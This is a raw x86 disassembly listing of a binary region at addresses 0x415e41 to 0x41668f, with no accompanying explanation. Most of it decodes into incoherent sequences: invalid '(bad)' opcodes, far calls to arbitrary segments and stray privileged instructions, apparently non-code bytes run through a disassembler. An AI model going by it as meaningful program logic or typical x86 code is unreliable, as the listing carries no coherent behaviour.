  415e41:	and    BYTE PTR [ebx+eax*2+0x802200],0x2
  415e49:	sbb    BYTE PTR ds:0x4140b600,al
  415e4f:	adc    al,0x0
  415e51:	adc    BYTE PTR [ecx],0x0
  415e54:	add    eax,0x80304800
  415e59:	and    BYTE PTR [eax+0x0],dl
  415e5c:	and    ch,ah
  415e5e:	add    eax,DWORD PTR [ecx]
  415e60:	and    DWORD PTR [eax+0x20415140],eax
  415e66:	rol    DWORD PTR [eax+0x12880040],0x6
  415e6d:	add    BYTE PTR [edx],al
  415e6f:	or     BYTE PTR [edx],dl
  415e71:	add    DWORD PTR [eax+eax*1],eax
  415e74:	popa   
  415e75:	add    al,ah
  415e77:	adc    BYTE PTR [ecx-0x76],al
  415e7a:	mov    al,ds:0xaaa16185
  415e7f:	dec    ecx
  415e80:	pusha  
  415e81:	add    ah,BYTE PTR [eax]
  415e83:	add    eax,0xc89c121
  415e88:	rol    BYTE PTR ds:0x86c30015,0x6c
  415e8f:	push   es
  415e90:	add    BYTE PTR [eax],al
  415e92:	add    BYTE PTR [edx-0x60],dl
  415e95:	adc    BYTE PTR [edx+0x5],al
  415e98:	adc    ah,BYTE PTR [ecx]
  415e9a:	or     al,0x0
  415e9c:	adc    BYTE PTR [esi+0x40],al
  415e9f:	add    eax,DWORD PTR [esp+ebx*2]
  415ea2:	add    BYTE PTR [eax],al
  415ea4:	sbb    al,0x0
  415ea6:	inc    ecx
  415ea7:	add    BYTE PTR [eax],al
  415ea9:	inc    esi
  415eaa:	pop    ebx
  415eab:	sbb    BYTE PTR [eax],0x84
  415eae:	mov    ds:0x40745620,al
  415eb3:	add    BYTE PTR [ebp+0x800000c],al
  415eb9:	jb     0x415ebb
  415ebb:	add    eax,0x1140088
  415ec0:	add    BYTE PTR [eax],al
  415ec2:	adc    al,0x62
  415ec4:	add    BYTE PTR [eax],0x0
  415ec7:	inc    ebp
  415ec8:	and    al,0x87
  415eca:	and    BYTE PTR [eax],al
  415ecc:	add    al,0xc3
  415ece:	ror    BYTE PTR [edx],0x40
  415ed1:	and    BYTE PTR [ecx],al
  415ed3:	inc    ecx
  415ed4:	xor    DWORD PTR [eax+0x800000],eax
  415eda:	add    eax,0x8c8100
  415edf:	push   eax
  415ee0:	add    al,BYTE PTR [ecx]
  415ee2:	sub    BYTE PTR [eax],al
  415ee4:	adc    BYTE PTR [eax],al
  415ee6:	leave  
  415ee7:	mov    BYTE PTR [edx],al
  415ee9:	inc    eax
  415eea:	sub    BYTE PTR [ecx+0x42],dl
  415eed:	add    BYTE PTR [ecx+ecx*2+0x0],al
  415ef1:	add    BYTE PTR [ebp-0x78],al
  415ef4:	add    BYTE PTR [eax],0x43
  415ef7:	add    eax,0x41a02020
  415efc:	add    DWORD PTR [eax+0x0],eax
  415eff:	or     BYTE PTR [eax],al
  415f01:	inc    ecx
  415f02:	and    BYTE PTR [eax+0x12],cl
  415f05:	add    BYTE PTR [eax],al
  415f07:	xor    al,0x40
  415f09:	add    BYTE PTR [eax],ah
  415f0b:	add    BYTE PTR [eax],ah
  415f0d:	inc    esi
  415f0e:	add    al,0x0
  415f10:	or     BYTE PTR [eax],cl
  415f12:	add    BYTE PTR [edx],al
  415f14:	xchg   ecx,eax
  415f15:	add    BYTE PTR [ecx],0x0
  415f18:	es add al,0x88
  415f1b:	and    al,BYTE PTR [edx]
  415f1d:	int    0x24
  415f1f:	add    eax,0x510051e1
  415f24:	sub    BYTE PTR [eax-0x5ffaee7c],ah
  415f2a:	adc    dh,BYTE PTR [eax]
  415f2c:	mov    DWORD PTR [eax],eax
  415f2e:	and    esp,eax
  415f30:	add    DWORD PTR [edx+0x0],0x9a478000
  415f37:	add    BYTE PTR [eax+eax*1],al
  415f3a:	ret    
  415f3b:	add    BYTE PTR [eax+0x41c44000],ah
  415f41:	inc    edx
  415f42:	add    BYTE PTR [esp+ebx*4],al
  415f45:	add    dl,al
  415f47:	add    BYTE PTR [ecx],al
  415f49:	add    BYTE PTR [eax+0x0],al
  415f4c:	inc    esp
  415f4d:	add    BYTE PTR [eax+0x21],ah
  415f50:	adc    BYTE PTR [eax],0x0
  415f53:	add    BYTE PTR [eax+0x42001000],cl
  415f59:	add    BYTE PTR [eax],ah
  415f5b:	add    DWORD PTR [ecx+0x41],ecx
  415f5e:	and    DWORD PTR [eax],eax
  415f60:	or     BYTE PTR ds:0x80082020,dh
  415f66:	nop
  415f67:	dec    ecx
  415f68:	inc    esi
  415f69:	add    BYTE PTR [eax],al
  415f6b:	dec    esp
  415f6c:	or     eax,0x4400a0d4
  415f71:	inc    ebp
  415f72:	or     al,0x1
  415f74:	add    BYTE PTR [ecx-0x5d9bcffe],al
  415f7a:	sbb    BYTE PTR [eax+eiz*4],cl
  415f7d:	add    BYTE PTR [eax],ch
  415f7f:	adc    BYTE PTR [eax+0x1380e19],al
  415f85:	add    BYTE PTR [edx-0x74],bl
  415f88:	add    BYTE PTR [eax+0x2],al
  415f8b:	push   es
  415f8c:	mov    BYTE PTR [esp+edx*2],al
  415f8f:	add    DWORD PTR [eax-0x76be9796],eax
  415f95:	add    DWORD PTR [esi],ebx
  415f97:	adc    DWORD PTR [ecx-0x60],eax
  415f9a:	add    DWORD PTR [ecx],0x9
  415f9d:	add    BYTE PTR [eax],bl
  415f9f:	adc    BYTE PTR [eax],cl
  415fa1:	add    BYTE PTR ds:0x500841c6,dh
  415fa7:	xchg   DWORD PTR [eax],ecx
  415fa9:	adc    DWORD PTR [eax],eax
  415fab:	adc    BYTE PTR [eax],dl
  415fad:	mov    BYTE PTR [edx],al
  415faf:	sub    BYTE PTR [eax],al
  415fb1:	adc    eax,DWORD PTR [eax]
  415fb3:	add    BYTE PTR [edx-0x95810cb],ch
  415fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fba:	loopne 0x415fed
  415fbc:	xlat   BYTE PTR ds:[ebx]
  415fbd:	loopne 0x415f4e
  415fbf:	dec    ecx
  415fc0:	call   0x4ff631b
  415fc5:	inc    ecx
  415fc6:	mov    al,0x8c
  415fc8:	or     cl,BYTE PTR [ebx+0x0]
  415fcb:	mov    esp,0xb9035100
  415fd0:	or     eax,0xa0f971de
  415fd5:	fst    QWORD PTR [edx]
  415fd7:	std    
  415fd8:	pop    esi
  415fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fda:	nop
  415fdb:	mov    eax,ds:0x69f0dda0
  415fe0:	push   cs
  415fe1:	call   0xdddca975
  415fe6:	cli    
  415fe7:	scas   al,BYTE PTR es:[edi]
  415fe8:	or     eax,0xceb5f54c
  415fed:	movsx  ebp,BYTE PTR [ebp-0x486fb5f9]
  415ff4:	cmovb  edi,esp
  415ff7:	mov    ch,0xc9
  415ff9:	inc    ecx
  415ffa:	cld    
  415ffb:	mov    ch,0x9b
  415ffd:	xor    bl,BYTE PTR [ebx]
  415fff:	ss sti 
  416001:	adc    BYTE PTR [eax-0x2b],dl
  416004:	lock in eax,0x1a
  416007:	xchg   edi,eax
  416008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416009:	sbb    BYTE PTR [eax-0x41],bl
  41600c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41600d:	push   0xdb10f88a
  416012:	(bad)  
  416014:	push   0x9
  416016:	pop    edx
  416017:	inc    ecx
  416018:	imul   edx,DWORD PTR [eax],0xffffff92
  41601b:	mov    ecx,DWORD PTR [esi-0x1a]
  41601e:	pusha  
  41601f:	xor    cl,BYTE PTR [esi]
  416021:	jecxz  0x415fe7
  416023:	imul   ebx,DWORD PTR [esi],0x66487d96
  416029:	push   ebx
  41602a:	sub    DWORD PTR [edi+eax*4],0xffffffd5
  41602e:	pusha  
  41602f:	rcr    edi,cl
  416031:	add    DWORD PTR [edx+ebp*4+0x4998a064],ebp
  416038:	lock push 0xd65fcb7c
  41603e:	mov    cs,WORD PTR [ecx-0x66]
  416041:	ds push edi
  416043:	iret   
  416044:	xchg   ebx,eax
  416045:	fmul   QWORD PTR [edi-0x702264b7]
  41604b:	dec    ecx
  41604c:	push   ds
  41604d:	pop    ebx
  41604e:	cwde   
  41604f:	dec    ecx
  416050:	stos   BYTE PTR es:[edi],al
  416051:	popa   
  416052:	aaa    
  416053:	dec    edx
  416054:	fstp   QWORD PTR [edx]
  416057:	mov    edi,0x4a4d6aa3
  41605c:	call   0x8fde:0x9b038fdd
  416063:	dec    ecx
  416064:	inc    edi
  416065:	sbb    dl,cl
  416067:	mov    ebx,0xc0ea19a1
  41606c:	popf   
  41606d:	or     DWORD PTR [eax-0xc],esi
  416070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416071:	popf   
  416072:	add    al,0x53
  416074:	in     al,0xec
  416076:	adc    ecx,esp
  416078:	fisttp QWORD PTR [edi+0x456b8234]
  41607f:	dec    edx
  416080:	call   0x8f61:0x99758fdd
  416087:	dec    ebx
  416088:	adc    DWORD PTR [ecx-0x6],edx
  41608b:	dec    ecx
  41608c:	icebp  
  41608d:	(bad)  
  416090:	call   0x8fdc:0x97cf19dd
  416097:	dec    ecx
  416098:	jmp    FWORD PTR [eax-0x5b]
  41609b:	jns    0x416038
  41609d:	fisttp QWORD PTR [edi+0x1ae9edd4]
  4160a3:	pushf  
  4160a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a5:	push   0x68a1356a
  4160aa:	mov    ds:0xde526e84,al
  4160af:	aam    0xd
  4160b1:	push   cs
  4160b2:	sbb    eax,0x8fdc9b07
  4160b7:	dec    ecx
  4160b8:	push   esp
  4160b9:	ficom  WORD PTR [eax-0x7a1764b7]
  4160bf:	mov    esi,0x863d4483
  4160c4:	fmul   QWORD PTR [edi-0x6a]
  4160c7:	test   ebp,esi
  4160c9:	push   esp
  4160ca:	xchg   edx,eax
  4160cb:	jne    0x416148
  4160cd:	mov    BYTE PTR [edx-0x271cf0f7],bl
  4160d3:	mov    ebp,0xd77ac96f
  4160d8:	push   eax
  4160d9:	fimul  WORD PTR [esi-0x71f665b7]
  4160df:	int    0x9a
  4160e1:	fild   WORD PTR ds:0xe5de050f
  4160e7:	xor    DWORD PTR [esp+ebx*8+0x62d6498f],ebp
  4160ee:	mov    WORD PTR [eax-0x66],cs
  4160f1:	fld    QWORD PTR ds:0xa82026ff
  4160f7:	shl    BYTE PTR [eax],cl
  4160f9:	(bad)  
  4160fa:	mov    cs,WORD PTR [ecx-0x66]
  4160fd:	aas    
  4160fe:	sbb    ecx,edi
  416100:	xchg   ebx,eax
  416101:	fmul   QWORD PTR [edi-0x6b5f9bb7]
  416107:	dec    ecx
  416108:	lock push 0x3e5b7d7c
  41610e:	leave  
  41610f:	mov    fs,WORD PTR [ebx-0x72b25af]
  416115:	in     eax,0x92
  416117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416118:	xlat   BYTE PTR ds:[ebx]
  416119:	push   0x3a9ec1eb
  41611e:	cwde   
  41611f:	aam    0xe
  416121:	(bad)  
  416122:	xchg   edx,eax
  416123:	mov    esi,0x856210a3
  416128:	out    dx,al
  416129:	cmc    
  41612a:	add    bh,BYTE PTR [ebx+0x48]
  41612d:	loope  0x416103
  41612f:	push   ecx
  416130:	add    eax,0x6031dfde
  416135:	fmul   QWORD PTR [edi-0x63dd2bb7]
  41613b:	mov    ebp,0x317b1f9e
  416140:	ins    BYTE PTR es:[edi],dx
  416141:	rcl    BYTE PTR [ebx-0x1b1f4064],0x51
  416148:	stos   BYTE PTR es:[edi],al
  416149:	xchg   esp,eax
  41614a:	xchg   edx,eax
  41614b:	or     bh,BYTE PTR [ebx-0x20]
  41614e:	xchg   edx,eax
  41614f:	mov    WORD PTR [edi+0x2651d4e0],?
  416155:	ficom  WORD PTR [edx-0x2b995c72]
  41615b:	ins    DWORD PTR es:[edi],dx
  41615c:	mov    bh,0x3e
  41615e:	pop    ecx
  41615f:	or     al,0xa3
  416161:	fucom  st(4)
  416163:	aam    0x87
  416165:	fld    QWORD PTR ds:0x98539a56
  41616b:	xor    DWORD PTR [ebx],esi
  41616d:	fisttp QWORD PTR [edi-0x6b9a9bb7]
  416173:	ins    DWORD PTR es:[edi],dx
  416174:	and    ah,BYTE PTR [edx]
  416176:	mov    ah,0x51
  416178:	pop    ebp
  416179:	loop   0x41610a
  41617b:	sahf   
  41617c:	es retf 0xe13
  416180:	xchg   DWORD PTR [esi],edi
  416182:	js     0x4161ce
  416184:	fisttp QWORD PTR [edi+0x2201c7ca]
  41618b:	pop    ebp
  41618c:	fcmovnu st,st(5)
  41618e:	jmp    0x9b89:0xa1dc1ed6
  416195:	sub    eax,0xdd99e778
  41619a:	(bad)  
  41619b:	shl    eax,cl
  41619d:	fprem  
  41619f:	and    BYTE PTR [ebx],cl
  4161a1:	add    bh,0x48
  4161a4:	adc    dl,bl
  4161a6:	js     0x41614f
  4161a8:	call   0xf8d5:0xe0d38fdd
  4161af:	xchg   ebx,eax
  4161b0:	sub    al,0x75
  4161b2:	xchg   DWORD PTR [ecx+0x10],ecx
  4161b5:	fidivr DWORD PTR [eax-0x69]
  4161b8:	call   0x1bd1:0xe0d38fdd
  4161bf:	(bad)  
  4161c0:	xchg   edi,eax
  4161c1:	loope  0x416192
  4161c3:	test   DWORD PTR [edx+0x285de094],ebp
  4161c9:	and    dl,BYTE PTR [edx-0x63d1d99f]
  4161cf:	dec    esp
  4161d0:	lock fstp DWORD PTR [ecx]
  4161d3:	lahf   
  4161d4:	mov    esp,ecx
  4161d6:	fistp  WORD PTR [ecx+0x24]
  4161d9:	xor    edi,DWORD PTR [ebp+edx*8+0x18]
  4161dd:	retf   0xbf1b
  4161e0:	mov    ebx,DWORD PTR [ecx]
  4161e2:	xchg   DWORD PTR [esi+0x31cc8a00],edi
  4161e8:	adc    ch,dl
  4161ea:	sbb    edx,DWORD PTR [eax+0x28]
  4161ed:	and    al,al
  4161ef:	dec    ebp
  4161f0:	(bad)  
  4161f1:	and    cl,BYTE PTR [eax-0x4f687841]
  4161f7:	dec    ecx
  4161f8:	fstp   QWORD PTR [eax+eiz*4]
  4161fc:	cwde   
  4161fd:	sub    dh,dh
  4161ff:	retf   0x47d5
  416202:	cdq    
  416203:	mov    ebp,0x3586bf9f
  416208:	jae    0x416232
  41620a:	adc    BYTE PTR [ebx+eax*4-0x1a2b57ad],al
  416211:	ficomp WORD PTR [esi+edx*4]
  416214:	lods   al,BYTE PTR ds:[esi]
  416215:	loop   0x4161e1
  416217:	xchg   esi,eax
  416218:	mov    edx,DWORD PTR [eax-0x64]
  41621b:	test   al,ch
  41621d:	leave  
  41621e:	add    edx,DWORD PTR [ecx-0x2a]
  416221:	sub    al,BYTE PTR [esi+edi*4-0x34b53763]
  416228:	aad    0x6d
  41622a:	and    dl,bl
  41622c:	sub    edx,DWORD PTR [edx-0x5a]
  41622f:	aam    0x9d
  416231:	add    al,BYTE PTR [eax-0x323174c6]
  416237:	cdq    
  416238:	jmp    0x416267
  41623a:	loopne 0x4161fa
  41623c:	mov    eax,ds:0x86480a5d
  416241:	push   edx
  416242:	xchg   ebp,eax
  416243:	xor    al,0x5f
  416245:	popa   
  416246:	push   edx
  416247:	dec    esi
  416248:	call   0x8fe2:0x5d12f1b0
  41624f:	sahf   
  416250:	es retf 0xd4f0
  416254:	adc    dl,ch
  416256:	sbb    al,bh
  416258:	mov    ds:0xceca42d9,eax
  41625d:	mov    eax,0xc59dfd34
  416262:	std    
  416263:	dec    ecx
  416264:	fld    QWORD PTR [edx]
  416267:	inc    eax
  416268:	into   
  416269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626a:	js     0x41621a
  41626c:	fisttp QWORD PTR [edi+0x5010b7bc]
  416273:	xor    dh,dh
  416275:	fisttp QWORD PTR [edi+0x43010e49]
  41627b:	dec    esp
  41627c:	fmul   QWORD PTR [ebp-0x2215ce60]
  416282:	(bad)
  416286:	add    eax,DWORD PTR [ecx+0x10]
  416289:	sbb    eax,0xc66f353a
  41628e:	fisttp QWORD PTR [ecx-0x65]
  416291:	fnstsw WORD PTR [edx+0x77ee1014]
  416297:	mov    WORD PTR [ebx-0x3ccb7023],ds
  41629d:	mov    DWORD PTR [ecx+0x32],esp
  4162a0:	movntps XMMWORD PTR [ebx+0x20fa8612],xmm4
  4162a7:	xchg   edx,eax
  4162a8:	pop    esp
  4162a9:	mov    esi,0xa83f598
  4162ae:	nop
  4162af:	dec    ecx
  4162b0:	fwait
  4162b1:	sbb    dl,BYTE PTR [eax+0x2dd9bc6]
  4162b7:	push   esp
  4162b8:	sbb    ebx,edx
  4162ba:	xchg   ebp,eax
  4162bb:	mov    esp,0xc98860a1
  4162c0:	adc    ah,al
  4162c2:	ror    BYTE PTR [edx-0x2aa96d0],1
  4162c8:	pushf  
  4162c9:	xor    ebx,DWORD PTR [ebx]
  4162cb:	inc    ecx
  4162cc:	(bad)  
  4162cd:	int    0x83
  4162cf:	out    dx,al
  4162d0:	stc    
  4162d1:	enter  0x4c1e,0x6d
  4162d5:	push   ebx
  4162d6:	xchg   ebp,eax
  4162d7:	shl    DWORD PTR [ecx+0x5e1ba223],cl
  4162dd:	adc    DWORD PTR [ecx-0x75],ebx
  4162e0:	or     esp,0xffffff8f
  4162e3:	dec    ecx
  4162e4:	call   0x8fdd:0x823258f1
  4162eb:	dec    ecx
  4162ec:	or     eax,0x177553d0
  4162f1:	add    bh,BYTE PTR [eax-0x53fde82e]
  4162f7:	stos   BYTE PTR es:[edi],al
  4162f8:	mov    al,fs:0x68f04998
  4162fe:	jl     0x4162cd
  416300:	pop    edi
  416301:	into   
  416302:	lock aam 0xe0
  416305:	in     eax,0xb4
  416307:	dec    ecx
  416308:	mov    ebx,ebp
  41630a:	(bad)  
  41630b:	mov    al,0x1c
  41630d:	push   ss
  41630e:	frstor [ebx-0x65e50ef0]
  416314:	xlat   BYTE PTR ds:[ebx]
  416315:	pop    esi
  416316:	mov    cl,BYTE PTR [edx-0x55]
  416319:	fisttp QWORD PTR [edi+0x1143a3bc]
  41631f:	xchg   BYTE PTR [ebp-0x5d422ad3],bl
  416325:	or     dl,BYTE PTR [eax+0x7add9b59]
  41632b:	sub    DWORD PTR [ebx+eiz*1],esp
  41632e:	cwde   
  41632f:	xor    DWORD PTR [ebx+0x1c498fdd],ebx
  416335:	or     dh,BYTE PTR [eax+ecx*4-0x5b6fe250]
  41633c:	sub    BYTE PTR [ecx-0x7f],ah
  41633f:	pop    ebx
  416340:	fcmovnu st,st(5)
  416342:	fbstp  TBYTE PTR [ecx]
  416344:	mov    ebx,edx
  416346:	(bad)
  41634a:	add    BYTE PTR [ebx],0xc3
  41634d:	jecxz  0x4162de
  41634f:	dec    ecx
  416350:	sahf   
  416351:	push   0xdddb5b6d
  416356:	sbb    BYTE PTR [edi-0x4e2fb76d],dl
  41635c:	fwait
  41635d:	or     eax,0x47ec4990
  416362:	nop
  416363:	mov    cl,0xe5
  416365:	jmp    0x3280:0x539a535d
  41636c:	(bad)  
  41636d:	fisttp DWORD PTR [edi-0x73dcdbb7]
  416373:	xlat   BYTE PTR ds:[ebx]
  416374:	dec    esi
  416375:	sahf   
  416376:	mov    eax,ds:0xd689b89
  41637b:	inc    esi
  41637c:	sub    ecx,DWORD PTR es:[eax+0x6e097a4d]
  416383:	cmp    eax,0xe2136b3f
  416388:	mov    al,0x1d
  41638a:	nop
  41638b:	dec    eax
  41638c:	jnp    0x4163f9
  41638e:	inc    ebx
  41638f:	xor    dh,BYTE PTR [edx+0x4e48901d]
  416395:	mov    ebx,0x339b89a1
  41639a:	js     0x416344
  41639c:	xchg   edi,eax
  41639d:	fisttp QWORD PTR [edi-0x5e40e17b]
  4163a3:	mov    DWORD PTR [ebx-0x6292eb14],ebx
  4163a9:	fisttp QWORD PTR [edi-0x5e3cb1b8]
  4163af:	mov    DWORD PTR [ebx-0x334e2fb9],ebx
  4163b5:	push   ecx
  4163b6:	dec    esp
  4163b7:	leave  
  4163b8:	call   0x8fdb:0x3d328053
  4163bf:	dec    ecx
  4163c0:	and    al,0x23
  4163c2:	test   BYTE PTR [ebp+0x5b],dl
  4163c5:	in     eax,dx
  4163c6:	adc    ecx,DWORD PTR [ebp-0x63]
  4163c9:	fisttp QWORD PTR [edi-0x18cb6c2c]
  4163cf:	xor    DWORD PTR [esi],edx
  4163d1:	fmul   QWORD PTR [edi+0x7560d649]
  4163d7:	pop    ebx
  4163d8:	fcmovnu st,st(5)
  4163da:	sahf   
  4163db:	into   
  4163dc:	mov    edi,ebx
  4163de:	(bad)
  4163e2:	js     0x416444
  4163e4:	xchg   edi,eax
  4163e5:	fisttp QWORD PTR [edi-0x5e38e17b]
  4163eb:	mov    DWORD PTR [ebx-0x63daeb14],ebx
  4163f1:	fisttp QWORD PTR [edi+0x1ae610d4]
  4163f7:	(bad)  
  4163f8:	(bad)  
  4163f9:	xchg   edi,eax
  4163fa:	int3   
  4163fb:	dec    ecx
  4163fc:	(bad)  
  4163ff:	push   ebp
  416400:	aam    0x4f
  416402:	xchg   edx,eax
  416403:	cmp    al,0x3f
  416405:	imul   eax,DWORD PTR ds:0x845b2652,0x931a1a4d
  41640f:	mov    edi,0x901b43d7
  416414:	mov    cl,0x43
  416416:	sbb    DWORD PTR [ecx+0x3ddd68b1],edx
  41641c:	sahf   
  41641d:	es int3 
  41641f:	mov    bl,0x9b
  416421:	xor    edx,edi
  416423:	mov    DWORD PTR [edx+0x1048e04f],ebx
  416429:	out    0xf7,al
  41642b:	js     0x416437
  41642d:	in     al,0x9f
  41642f:	dec    eax
  416430:	adc    dh,cl
  416432:	js     0x4164a9
  416434:	cwde   
  416435:	fisttp QWORD PTR [edi-0x67a4d95e]
  41643b:	aam    0x10
  41643d:	rcr    BYTE PTR [ebx],cl
  41643f:	sbb    BYTE PTR [esi-0x1b2b33d5],bl
  416445:	xor    DWORD PTR [ebx-0x67c4d912],eax
  41644b:	dec    esp
  41644c:	neg    BYTE PTR [ecx]
  41644e:	lahf   
  41644f:	add    dh,ah
  416451:	jecxz  0x4163f1
  416453:	add    BYTE PTR [esi],cl
  416455:	repnz sbb al,0xbe
  416458:	mov    ecx,0x269ae5f5
  41645d:	pop    ebx
  41645e:	cwde   
  41645f:	dec    esp
  416460:	sbb    edx,ebp
  416462:	sbb    bl,BYTE PTR [eax-0x7e2c975d]
  416468:	jecxz  0x41644a
  41646a:	push   edi
  41646b:	inc    ecx
  41646c:	imul   eax,DWORD PTR [ecx],0x58
  41646f:	or     eax,DWORD PTR [eax+eiz*8-0x7671f63e]
  416476:	sbb    ebx,DWORD PTR [eax+0x560e68ab]
  41647c:	es push esp
  41647e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41647f:	dec    esp
  416480:	adc    dl,dl
  416482:	xchg   ebx,eax
  416483:	(bad)  
  416484:	mov    ds:0xf9a334d0,eax
  416489:	pusha  
  41648a:	push   esi
  41648b:	jb     0x41650a
  41648d:	stos   BYTE PTR es:[edi],al
  41648e:	(bad)  
  41648f:	mov    edi,0x682d468f
  416494:	push   es
  416495:	inc    ecx
  416496:	(bad)  
  416497:	mov    edi,0x4654c68b
  41649c:	call   0x8fde:0x1fd51bdd
  4164a3:	dec    ecx
  4164a4:	jle    0x4164ef
  4164a6:	sbb    esp,ebp
  4164a8:	sbb    ebx,esi
  4164aa:	(bad)
  4164ae:	cwde   
  4164af:	aam    0xe
  4164b1:	jmp    0xbe93:0x390f3f9a
  4164b8:	mov    ds:0x96c37833,eax
  4164bd:	fisttp QWORD PTR [edi-0x5daca4ab]
  4164c3:	lahf   
  4164c4:	add    ebp,DWORD PTR [ebx+0x4d]
  4164c7:	or     ebx,edx
  4164c9:	fadd   QWORD PTR ds:0x8c6f833a
  4164cf:	dec    ecx
  4164d0:	call   0x6068:0xd2be4fe9
  4164d7:	aad    0x16
  4164d9:	out    dx,al
  4164da:	sbb    bh,BYTE PTR [ebp-0x5a]
  4164dd:	rol    DWORD PTR ds:0x93d5264c,cl
  4164e3:	mov    esi,0x520ce0a3
  4164e8:	dec    eax
  4164e9:	jmp    0xecfc233d
  4164ee:	dec    ecx
  4164ef:	cmp    bh,BYTE PTR [edx-0x1fb36ab1]
  4164f5:	in     eax,0xcf
  4164f7:	mov    ebp,ebp
  4164f9:	sub    eax,0xfd9ab1e2
  4164fe:	or     edx,DWORD PTR [ebx]
  416500:	call   0x8fd9:0xf5328053
  416507:	dec    ecx
  416508:	cmc    
  416509:	mov    BYTE PTR [ebx+0x26],bh
  41650c:	push   ds
  41650d:	mov    eax,ds:0x693934a4
  416512:	in     eax,0x51
  416514:	cmp    ebx,DWORD PTR es:[eax-0x44e609b4]
  41651b:	pushf  
  41651c:	iret   
  41651d:	push   ecx
  41651e:	loopne 0x4164cf
  416520:	stos   BYTE PTR es:[edi],al
  416521:	xchg   edi,eax
  416522:	repz pop edi
  416524:	fwait
  416525:	dec    edi
  416526:	fmul   st,st(4)
  416528:	push   esi
  416529:	adc    BYTE PTR [eax+0x3dd9b49],0x89
  416530:	es push ebx
  416532:	cwde   
  416533:	dec    esp
  416534:	dec    esi
  416535:	jle    0x4164c7
  416537:	dec    ecx
  416538:	fwait
  416539:	push   0xe6184cce
  41653e:	sbb    bl,BYTE PTR [eax+0x5279609f]
  416544:	ins    BYTE PTR es:[edi],dx
  416545:	(bad)  
  416546:	jae    0x4165b9
  416548:	dec    eax
  416549:	mov    esi,esi
  41654b:	test   BYTE PTR [ecx],0x87
  41654e:	nop
  41654f:	jns    0x416560
  416551:	out    0xb4,al
  416553:	dec    eax
  416554:	stos   BYTE PTR es:[edi],al
  416555:	fisttp QWORD PTR [edi+0x7215af4a]
  41655b:	cmp    BYTE PTR [esi],ah
  41655d:	and    ebx,DWORD PTR [eax-0x6f81e1b4]
  416563:	dec    ecx
  416564:	fwait
  416565:	loopne 0x416579
  416567:	out    dx,al
  416568:	fisttp QWORD PTR [edi+0x5a508b84]
  41656f:	aad    0x26
  416571:	mov    ds:0xc09b4990,al
  416576:	cwde   
  416577:	dec    eax
  416578:	adc    dh,ah
  41657a:	ja     0x4165c2
  41657c:	xchg   esi,eax
  41657d:	fisttp QWORD PTR [edi-0x6ff1c352]
  416583:	dec    ecx
  416584:	fwait
  416585:	push   0x1e2655d0
  41658a:	pushf  
  41658b:	aam    0xe3
  41658d:	cmc    
  41658e:	sbb    bl,BYTE PTR [edi+0x61e016a3]
  416594:	movntq QWORD PTR [edx],mm3
  416597:	dec    edx
  416598:	aam    0x25
  41659a:	test   al,0xbe
  41659c:	(bad)
  4165a0:	out    0x5,al
  4165a2:	xchg   ebx,eax
  4165a3:	xchg   esi,eax
  4165a4:	mov    ds:0x2465d866,eax
  4165a9:	sub    edx,DWORD PTR [eax+edx*1+0x4990fddb]
  4165b0:	(bad)  
  4165b3:	inc    eax
  4165b4:	fdivrp st(3),st
  4165b6:	(bad)
  4165ba:	push   esi
  4165bb:	(bad)  
  4165bc:	stos   DWORD PTR es:[edi],eax
  4165bd:	fisttp QWORD PTR [edi-0x2b5b64b7]
  4165c3:	ins    DWORD PTR es:[edi],dx
  4165c4:	mov    bh,0xdd
  4165c6:	(bad)
  4165ca:	pop    ecx
  4165cb:	or     al,0x9f
  4165cd:	(bad)  
  4165cf:	dec    ecx
  4165d0:	add    ebp,DWORD PTR [edx-0x233fa5d9]
  4165d6:	add    eax,0x8b63833a
  4165db:	dec    ecx
  4165dc:	call   0x9316:0x2ba3c82b
  4165e3:	scas   eax,DWORD PTR es:[edi]
  4165e4:	popf   
  4165e5:	loope  0x41657f
  4165e7:	mov    edx,0xc485f9a
  4165ec:	sub    al,0xdf
  4165ee:	iret   
  4165ef:	or     esi,DWORD PTR [eax-0x48ac775d]
  4165f5:	jmp    0x4165a5
  4165f7:	add    edx,DWORD PTR [ebx+0x685343de]
  4165fd:	inc    DWORD PTR [edi+0x4b]
  416600:	out    0x9d,eax
  416602:	call   0xa96a:0x347039d
  416609:	dec    ebp
  41660a:	add    bh,BYTE PTR [ecx-0x490ebafe]
  416610:	and    al,BYTE PTR [ecx-0x29]
  416613:	mov    bh,0xba
  416615:	sub    al,0x4
  416617:	xor    ebp,edi
  416619:	inc    edx
  41661a:	aas    
  41661b:	sbb    DWORD PTR [eax],edx
  41661d:	cmp    eax,0x21a1b328
  416622:	ffreep st(7)
  416624:	out    dx,al
  416625:	loopne 0x416623
  416627:	mov    eax,0x56be42ff
  41662c:	and    al,0xe8
  41662e:	mov    bl,0x95
  416630:	(bad)  
  416632:	nop
  416633:	loop   0x4165cc
  416635:	aaa    
  416636:	rol    DWORD PTR [ecx+0x2d],cl
  416639:	call   0x1c34b425
  41663e:	cmc    
  41663f:	push   ebp
  416640:	lds    edi,FWORD PTR [eax+ebx*4]
  416643:	(bad)
  416646:	push   edx
  416647:	mov    ah,dl
  416649:	push   edi
  41664b:	imul   eax,edi,0xe58fd46b
  416651:	adc    DWORD PTR [eax],edx
  416653:	pop    ebx
  416654:	mov    ds:0xd34a982a,eax
  416659:	lock ret 
  41665b:	fdivr  QWORD PTR [esi+eax*1-0x77]
  41665f:	shr    DWORD PTR [ebx+0x60ca689c],1
  416665:	sub    ebx,edi
  416667:	jns    0x416641
  416669:	addr16 cwde 
  41666b:	push   ecx
  41666c:	push   esi
  41666d:	pop    edx
  41666e:	ror    DWORD PTR [ebx-0x63ee1344],cl
  416674:	add    al,0x41
  416676:	clc    
  416677:	sar    ebx,1
  416679:	cdq    
  41667a:	loopne 0x416615
  41667c:	loopne 0x4166db
  41667e:	fmul   QWORD PTR [edx+0xb]
  416681:	loopne 0x41661c
  416683:	inc    eax
  416684:	(bad)  
  416685:	dec    esi
  416686:	fistp  WORD PTR [ebp+0x5f]
  416689:	mov    esi,0xe89c5411
  41668e:	pop    edx
  41668f:	pop    edx
